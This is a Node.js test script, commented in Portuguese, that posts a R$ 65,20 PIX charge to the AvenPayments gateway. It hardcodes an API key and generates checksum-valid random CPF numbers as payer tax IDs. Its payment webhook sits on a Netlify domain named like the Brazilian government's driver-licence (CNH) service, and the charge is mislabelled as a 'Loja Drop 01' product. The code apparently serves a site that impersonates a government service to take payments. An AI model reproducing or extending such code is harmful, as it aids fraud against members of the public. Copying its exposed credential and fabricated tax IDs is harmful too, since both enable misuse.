/**
 * TESTE LOCAL - Simula a função pix-aven.js
 * Gera PIX R$ 65,20 localmente ANTES de deploy
 */

const https = require('https');

// Simular as variáveis de ambiente
const AVEN_BASE = "https://api.avenpayments.com";
const AVEN_API_KEY = "2zxA50CzfpTMZgKCwuotYv681fsfo4bcrXrdttHxdD4";

function gerarCpfValido() {
  const d = new Array(9);
  for (let i = 0; i < 9; i++) {
    d[i] = Math.floor(Math.random() * 10);
  }
  
  let soma = 0;
  for (let i = 0; i < 9; i++) {
    soma += d[i] * (10 - i);
  }
  let resto = soma % 11;
  d[9] = resto < 2 ? 0 : 11 - resto;
  
  soma = 0;
  for (let i = 0; i < 10; i++) {
    soma += d[i] * (11 - i);
  }
  resto = soma % 11;
  d[10] = resto < 2 ? 0 : 11 - resto;
  
  return d.join('');
}

function toAmountReais(rawAmount) {
  if (rawAmount == null || rawAmount === undefined || rawAmount === "") {
    console.log("[PIX] Sem amount, usando R$ 65,20");
    return 65.20;
  }
  
  const n = Number(rawAmount);
  if (!Number.isFinite(n)) {
    console.log("[PIX] Amount inválido, usando R$ 65,20");
    return 65.20;
  }
  
  if (n >= 6000) {
    return n / 100;
  }
  
  // ✅ FORÇA O VALOR 65.20 DO FRONTEND
  if (n === 65.20 || n === 6520) {
    return 65.20;
  }
  
  if (n >= 60 && n < 70) {
    return 65.20;
  }
  
  if (n >= 70 && n < 90) {
    return 79.70;
  }
  
  return n;
}

function fmtPhone(phone) {
  if (!phone) return "11999999999";
  const digits = phone.replace(/\D/g, "");
  if (digits.length === 11) return digits;
  if (digits.length === 10) return digits;
  return digits;
}

async function gerarPixAvenpay() {
  console.log('\n╔════════════════════════════════════════════════════════════╗');
  console.log('║       GERANDO PIX NA GATEWAY - TESTE LOCAL                  ║');
  console.log('║              Valor: R$ 65,20                               ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');

  const randId = Math.random().toString(36).slice(2, 10);
  const rawAmount = 65.20; // Valor do frontend
  const amountReais = toAmountReais(rawAmount);
  const amountCents = Math.round(amountReais * 100);

  const customerName = 'Teste Gateway 65,20';
  const customerEmail = `teste${randId}@gmail.com`;
  const customerPhone = fmtPhone('11987654321');
  const cpfRaw = '11144477735';
  const customerCpf = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();
  const externalRef = `order_${randId}`;

  console.log('[PIX-AVEN] Amount:', amountReais, 'Cents:', amountCents);
  console.log('[PIX-AVEN] Customer:', { name: customerName, email: customerEmail, cpf: customerCpf });

  // Payload para AvenPayments
  const payload = {
    amount: amountCents,
    currency: "BRL",
    method: "PIX",
    description: "Loja Drop 01",
    externalRef: externalRef,
    notificationUrl: "https://cnh-brasil-gov-br.netlify.app/webhook/payment",
    ip: "177.0.0.1",
    payer: {
      name: customerName,
      taxId: customerCpf,
      email: customerEmail,
      phone: `55${customerPhone}`,
    },
    items: [{
      quantity: 1,
      name: "Loja Drop 01",
      price: amountCents,
      type: "PHYSICAL",
    }],
    metadata: {
      provider: "winnerpay-migration",
      orderId: externalRef,
    }
  };

  console.log('\n📤 Enviando payload para AVENPAY...\n');

  return new Promise((resolve) => {
    const authHeader = `Bearer ${AVEN_API_KEY}`;
    const payloadBuffer = Buffer.from(JSON.stringify(payload));

    const options = {
      hostname: 'api.avenpayments.com',
      port: 443,
      path: '/v1/payment',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': payloadBuffer.length,
        'Authorization': authHeader,
      }
    };

    const req = https.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        try {
          const text = data;
          if (!res.ok && res.statusCode !== 200) {
            let errMsg = text;
            try { errMsg = JSON.parse(text)?.message || errMsg; } catch {}
            console.error("[AvenPayments] Erro HTTP:", res.statusCode, errMsg);
            resolve({
              success: false,
              error: errMsg,
              debug: { status: res.statusCode, body: text.substring(0, 200) }
            });
            return;
          }

          let parsed = {};
          try { parsed = JSON.parse(text); } catch {
            console.error("[AvenPayments] Parse error:", text.substring(0, 200));
            resolve({
              success: false,
              error: "Resposta inválida da gateway",
              debug: text.substring(0, 200)
            });
            return;
          }

          const transactionId = parsed.id || parsed.externalRef || null;
          const pixCode = parsed.data?.copypaste || null;

          if (!transactionId || !pixCode) {
            console.error("[AvenPayments] Resposta incompleta:", { transactionId, pixCode });
            resolve({
              success: false,
              error: "Gateway retornou resposta incompleta",
              debug: { transaction: transactionId, pix: !!pixCode }
            });
            return;
          }

          console.log('\n╔════════════════════════════════════════════════════════════╗');
          console.log('║            ✅ PIX GERADO COM SUCESSO!                      ║');
          console.log('╚════════════════════════════════════════════════════════════╝\n');

          console.log('📋 DETALHES:');
          console.log(`   💰 Valor: R$ ${amountReais.toFixed(2)}`);
          console.log(`   📝 Transaction ID: ${transactionId}`);
          console.log(`   👤 Cliente: ${customerName}`);
          console.log(`   📧 Email: ${customerEmail}`);
          console.log(`   📱 CPF: ${customerCpf}`);

          console.log('\n📱 CÓDIGO PIX (copia e cola):\n');
          console.log(`${pixCode}\n`);

          console.log('═'.repeat(60) + '\n');

          resolve({
            success: true,
            pixCode,
            transaction_id: transactionId,
            transactionId,
            status: "pending",
            amount: amountReais
          });

        } catch (err) {
          console.error("[PIX-AVEN] Erro:", err.message);
          resolve({
            success: false,
            error: String(err)
          });
        }
      });
    });

    req.on('error', (e) => {
      console.error("[PIX-AVEN] Erro de conexão:", e.message);
      resolve({
        success: false,
        error: e.message
      });
    });

    req.write(payloadBuffer);
    req.end();
  });
}

// EXECUTA
(async () => {
  const resultado = await gerarPixAvenpay();

  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║           RESPOSTA COMPLETA DA GATEWAY                    ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');
  console.log(JSON.stringify(resultado, null, 2));

  if (resultado.success) {
    console.log('\n✅ PIX GERADO! Pronto para deploy!\n');
  } else {
    console.log('\n⚠️  Verifique a chave de API\n');
  }
})();
